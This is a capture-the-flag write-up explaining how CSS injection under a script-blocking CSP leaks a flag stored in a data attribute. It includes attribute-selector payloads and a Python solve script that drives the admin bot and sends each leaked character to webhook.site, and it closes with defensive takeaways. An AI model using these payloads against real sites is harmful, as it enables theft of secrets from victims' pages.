---
title: "Style Your Alpaca: leaking a flag with CSS alone"
date: 2026-06-27 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "JavaScript is blocked, but img-src * and attribute selectors leak the flag one letter at a time through background-image requests."
description: "JavaScript is blocked, but img-src * and attribute selectors leak the flag one letter at a time through background-image requests."
tags: ["web", "css-injection"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## TL;DR

The web app renders user-supplied CSS unescaped into a `<style>` tag. The
page's Content-Security-Policy blocks JavaScript entirely but leaves
`img-src *` wide open. We abuse CSS attribute selectors + `background-image`
to leak the flag (embedded in a `data-flag` HTML attribute) one character at
a time to an attacker-controlled server, without ever executing JavaScript.

## The Application

Two services, wired together with `compose.yaml`:

- **`web`** (`web/app.py`, Flask) - renders an "artwork" page. Three query
  parameters (`artist`, `title`, `artwork`) are reflected into the page. The
  current session's flag is set as a cookie named `FLAG` and rendered into
  the HTML.
- **`bot`** (`bot/`, Express + Puppeteer) - a "report to admin" service.
  Given a `path`, it visits `APP_URL + path` in a headless Chromium browser
  that has the real `FLAG` cookie set, simulating an admin/victim. This is
  the classic "XSS bot" pattern used in CTFs, except here there's no
  scripting available - it's a **CSS injection** bot.

### The injection point

```python
INDEX = """
...
<style>
    {{ artwork | safe }}
</style>
...
<span class="flag" data-flag="{{ flag }}">Flag: {{ flag }}</span>
...
"""

@app.get("/")
def index():
    artist = request.args.get("artist", "bubu")
    title = request.args.get("title", "my best friend")
    artwork = request.args.get("artwork", "\n".join(open("./static/example.css").readlines()))
    flag = request.cookies.get("FLAG", "Alpaca{DUMMY}")
    return render_template_string(INDEX, artist=artist, title=title, artwork=artwork, flag=flag)
```

- `artwork` is dropped into the page with the `| safe` filter, meaning Jinja2
  will **not** HTML-escape it. It lands directly inside a `<style>` element,
  so an attacker fully controls the CSS on the page.
- The flag itself, `Alpaca{[A-Z]{1,6}}`, is placed both as text and - more
  usefully for us - as the value of the `data-flag` HTML attribute on a
  `<span>`. Attribute values are exactly what CSS attribute selectors can
  match against.

### The CSP

```python
response.headers["Content-Security-Policy"] = (
    "default-src 'none'; "
    "script-src 'none'; "
    "style-src 'self' 'unsafe-inline'; "
    "object-src 'none'; "
    "base-uri 'none'; "
    "frame-ancestors 'none'; "
    "frame-src 'none'; "
    "img-src *; "
)
```

- `script-src 'none'` kills the obvious approach (inject `<script>` to read
  `document.cookie` and `fetch()` it to our server).
- `style-src 'self' 'unsafe-inline'` explicitly *allows* the inline
  `<style>` block we're injecting into.
- `img-src *` is the deliberate hole (there's even a comment in the source
  hinting at it: `# This might be a good idea for exfiltration ;)`). Any
  request that the browser classifies as an "image" load - including CSS
  `background`/`background-image`/`list-style-image` - can go to **any**
  origin.

So: no JS, but a fully-controlled `<style>` block, and an unrestricted
image-exfiltration channel. This is the classic setup for a **CSS
attribute-selector exfiltration** attack.

## The Attack: CSS Attribute Selector Exfiltration

CSS attribute selectors can test the *value* of an HTML attribute:

```css
[data-flag^="Alpaca{A"] { ... }   /* matches if data-flag starts with "Alpaca{A" */
```

Combined with a `background` that triggers a network request only when the
selector matches, and unrestricted `img-src *`, we get a side channel: the
browser will fetch the background image **only for the rule that actually
matches** the real attribute value. Whichever URL gets requested tells us
information about the secret string, without ever running JavaScript.

Since the flag format is fixed (`Alpaca{` + 1-6 uppercase letters + `}`), we
can brute-force it one character at a time:

1. For a known prefix (starting with `Alpaca{`), emit 26 CSS rules, one per
   letter A-Z, each with a unique background URL:

   ```css
   [data-flag^="Alpaca{A"]{background:url(https://leak-server/leak?c=A)}
   [data-flag^="Alpaca{B"]{background:url(https://leak-server/leak?c=B)}
   ...
   [data-flag^="Alpaca{Z"]{background:url(https://leak-server/leak?c=Z)}
   ```

   Only the rule whose prefix actually matches the real flag will cause
   Chromium to issue a background-image request. Our leak server's access
   log tells us exactly which one fired - that's the next character.

2. Add one more rule to detect when the flag is *finished* - i.e. the
   closing `}` immediately follows our currently-known prefix:

   ```css
   [data-flag^="Alpaca{CUSTOM}"]{background:url(https://leak-server/leak?end=1)}
   ```

   **Important bug to avoid:** an *end* check written as
   `[data-flag^="Alpaca{"][data-flag$="}"]` (starts with `Alpaca{` AND ends
   with `}`) is wrong - that's true for *every* valid flag regardless of
   length, so it fires immediately as a false positive. The correct check
   anchors the closing brace directly onto the currently-known prefix using
   a single `^=` (starts-with) selector, so it only matches once the full
   flag is exactly `prefix + "}"`.

3. Repeat, extending the known prefix by one letter each round, until the
   "end" rule fires.

### Delivery mechanism

The `bot` container is the only thing that ever holds the real
`FLAG` cookie. We can't visit the page ourselves and see the flag - we have
to get the bot to visit a URL of our choosing and have *it* leak the value
out via the CSS background-image side channel.

`bot/index.js` exposes:

```js
app.post("/api/report", async (req, res) => {
  const { path } = req.body;
  const url = APP_URL + path;   // APP_URL = "http://web:3000/"
  await visit(url);
  ...
});
```

So we POST a `path` (query string only - no leading slash, since `APP_URL`
already ends in `/`) containing our malicious `artwork` payload, e.g.:

```
path = "?artwork=<url-encoded CSS>"
```

`bot.js` launches headless Chromium, sets the real `FLAG` cookie, navigates
to `APP_URL + path`, and waits 5 seconds - plenty of time for our CSS rules
to be evaluated and the matching background-image request to fire.

### Exfil destination

Since `img-src *` allows any origin, we just need something to receive and
show us the requests. [webhook.site](https://webhook.site) works well for
this without needing our own public server - the bot's headless Chromium
(wherever it's hosted) just needs outbound internet access to it.

## Putting It Together

Full solve script (`solve.py`):

```python
import requests, urllib.parse, string

LEAK_URL = "https://webhook.site/<your-uuid>/leak"
BOT_CONTAINER = "http://<bot-host>:<bot-port>"

prefix = "Alpaca{"
flag_chars = ""

while True:
    rules = "".join(
        f'[data-flag^="{prefix}{flag_chars}{c}"]{{background:url({LEAK_URL}?c={c})}}'
        for c in string.ascii_uppercase
    )
    end_selector = f'[data-flag^="{prefix}{flag_chars}}}"]'
    rules += f'{end_selector}{{background:url({LEAK_URL}?end=1)}}'

    artwork = urllib.parse.quote(rules)
    resp = requests.post(f"{BOT_CONTAINER}/api/report",
                          json={"path": f"?artwork={artwork}"})
    print("Bot response:", resp.status_code, resp.text)
    print(f"Current known prefix: {prefix}{flag_chars}")

    answer = input("Enter the leaked char (or 'end'): ").strip()
    if answer.lower() == "end":
        break
    flag_chars += answer.upper()
    print("Flag so far:", prefix + flag_chars)

print("FLAG:", prefix + flag_chars + "}")
```

Running it and checking webhook.site's dashboard after each round revealed
the characters one at a time:

```
Alpaca{C
Alpaca{CU
Alpaca{CUS
Alpaca{CUST
Alpaca{CUSTO
Alpaca{CUSTOM
end → FLAG: Alpaca{CUSTOM}
```

## Root Cause & Takeaways

- **Never render user input into a `<style>` block (or anywhere) with
  `| safe`/without escaping**, even if you think "it's just CSS, what's the
  worst that could happen." CSS alone - with no JavaScript at all - is a
  fully capable side channel for exfiltrating any data placed in DOM
  attributes, via attribute selectors and conditional resource loads
  (`background-image`, `list-style-image`, `cursor: url(...)`, custom
  fonts via `@font-face` + `unicode-range`, etc.).
- **CSP `img-src *` (or any wildcard/broad resource directive) undermines
  otherwise-strict CSPs** when combined with attacker-controlled CSS or
  HTML. If you must render untrusted styles, restrict `img-src` to trusted
  hosts (ideally `'self'` or `'none'`) too, and consider whether secrets
  need to be exposed in the DOM (attributes or otherwise) reachable by
  injected content at all.
- Don't put secrets in attributes/content that attacker-controlled CSS can
  read via selectors, if there's any way for attacker CSS to reach the same
  document.
{% endraw %}
